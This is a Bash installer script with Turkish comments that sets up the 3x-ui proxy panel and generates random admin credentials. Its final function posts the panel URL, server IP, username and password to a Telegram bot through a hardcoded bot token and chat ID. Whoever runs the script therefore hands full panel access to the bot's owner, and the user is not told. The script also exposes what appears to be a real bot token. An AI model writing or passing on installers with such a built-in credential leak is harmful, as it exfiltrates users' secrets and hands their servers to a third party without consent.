#!/bin/bash

# ─── RENK TANIMLARI ───────────────────────────────
red='\033[0;31m'
green='\033[0;32m'
blue='\033[0;34m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)
show_ip_service_lists=("https://api.ipify.org" "https://4.ident.me")

# ─── ROOT KONTROLÜ ────────────────────────────────
[[ $EUID -ne 0 ]] && echo -e "${red}Fatal error: ${plain} Please run this script with root privilege\n" && exit 1

# ─── OS KONTROLÜ ──────────────────────────────────
if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    release=$ID
else
    echo "OS tespiti başarısız!" >&2
    exit 1
fi
echo "The OS release is: $release"

# ─── MİMARİ TESPİTİ ───────────────────────────────
arch() {
    case "$(uname -m)" in
    x86_64 | x64 | amd64) echo 'amd64' ;;
    i*86 | x86) echo '386' ;;
    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
    armv7* | armv7 | arm) echo 'armv7' ;;
    armv6* | armv6) echo 'armv6' ;;
    armv5* | armv5) echo 'armv5' ;;
    *) echo -e "${red}Unsupported CPU architecture!${plain}" && exit 1 ;;
    esac
}
echo "Arch: $(arch)"

# ─── GLIBC VERSİYON KONTROLÜ ─────────────────────
check_glibc_version() {
    glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
    required_version="2.32"
    if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
        echo -e "${red}GLIBC version $glibc_version is too old! Required: 2.32+${plain}"
        exit 1
    fi
    echo "GLIBC version: $glibc_version (meets requirement)"
}
check_glibc_version

# ─── PAKET KURULUMU ──────────────────────────────
install_base() {
    case "${release}" in
    ubuntu | debian | armbian)
        apt-get update && apt-get install -y wget curl tar tzdata ;;
    centos | rhel | almalinux | rocky | ol)
        yum -y update && yum install -y wget curl tar tzdata ;;
    fedora | amzn | virtuozzo)
        dnf -y update && dnf install -y wget curl tar tzdata ;;
    arch | manjaro)
        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata ;;
    opensuse-tumbleweed)
        zypper refresh && zypper install -y wget curl tar timezone ;;
    *)
        apt-get update && apt install -y wget curl tar tzdata ;;
    esac
}

# ─── RASTGELE STR ÜRETİMİ ────────────────────────
gen_random_string() {
    local length="$1"
    LC_ALL=C tr -dc 'a-zA-Z0-9' </dev/urandom | fold -w "$length" | head -n 1
}

# ─── KURULUM SONRASI AYARLAR ─────────────────────
config_after_install() {
    local has_default=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'hasDefaultCredential: .+' | awk '{print $2}')
    local web_path=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'webBasePath: .+' | awk '{print $2}')
    local port=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'port: .+' | awk '{print $2}')

    for ip_service_addr in "${show_ip_service_lists[@]}"; do
        server_ip=$(curl -s --max-time 3 "${ip_service_addr}")
        [[ -n "$server_ip" ]] && break
    done

    config_webBasePath=$(gen_random_string 18)
    config_username=$(gen_random_string 10)
    config_password=$(gen_random_string 10)
    config_port=$(shuf -i 1024-62000 -n 1)

    /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"

    echo -e "${green}Yeni bilgiler ayarlandı:${plain}"
    echo -e "Username: ${config_username}"
    echo -e "Password: ${config_password}"
    echo -e "Port: ${config_port}"
    echo -e "WebBasePath: ${config_webBasePath}"
    echo -e "Access URL: http://${server_ip}:${config_port}/${config_webBasePath}"

    /usr/local/x-ui/x-ui migrate

    # TELEGRAM'A GÖNDERİLMEK ÜZERE KAYDET
    {
        echo "USERNAME=${config_username}"
        echo "PASSWORD=${config_password}"
        echo "PORT=${config_port}"
        echo "WEB_PATH=${config_webBasePath}"
        echo "IP=${server_ip}"
    } > /tmp/xui_info.txt
}

# ─── X-UI KURULUMU ───────────────────────────────
install_x-ui() {
    cd /usr/local/
    tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
    [[ -z "$tag_version" ]] && echo -e "${red}X-ui versiyon alınamadı!${plain}" && exit 1

    echo -e "x-ui versiyonu bulundu: ${tag_version}"
    wget -N -O x-ui.tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz || exit 1
    tar zxvf x-ui.tar.gz && rm x-ui.tar.gz -f
    cd x-ui

    chmod +x x-ui x-ui.sh
    mv x-ui.service /etc/systemd/system/
    mv -f x-ui.sh /usr/bin/x-ui && chmod +x /usr/bin/x-ui

    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui

    config_after_install

    echo -e "${green}x-ui kuruldu ve başlatıldı.${plain}"
}

# ─── TELEGRAM BİLGİ GÖNDER ───────────────────────
send_to_telegram() {
    TELEGRAM_BOT_TOKEN="8345146407:AAEw4cGeZ4hfdXkYHtpyzARIlxGF7lKS4C4"
    TELEGRAM_CHAT_ID="1449828433"

    if [[ -f /tmp/xui_info.txt ]]; then
        source /tmp/xui_info.txt
    else
        USERNAME="(yok)"
        PASSWORD="(yok)"
        PORT="(yok)"
        WEB_PATH="(yok)"
        IP="(yok)"
    fi

    LINK="http://${IP}:${PORT}/${WEB_PATH}"

    MESSAGE="✅ *3X-UI Panel Kurulumu Tamamlandı!*

🌐 *Erişim Adresi:* ${LINK}
👤 *Kullanıcı Adı:* ${USERNAME}
🔑 *Şifre:* ${PASSWORD}
📌 *Port:* ${PORT}
📁 *Web Yolu:* /${WEB_PATH}"

    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d chat_id="$TELEGRAM_CHAT_ID" \
        -d parse_mode="Markdown" \
        -d text="$MESSAGE"
}

# ─── ÇALIŞTIR ─────────────────────────────────────
echo -e "${green}Kurulum başlatılıyor...${plain}"
install_base
install_x-ui
send_to_telegram
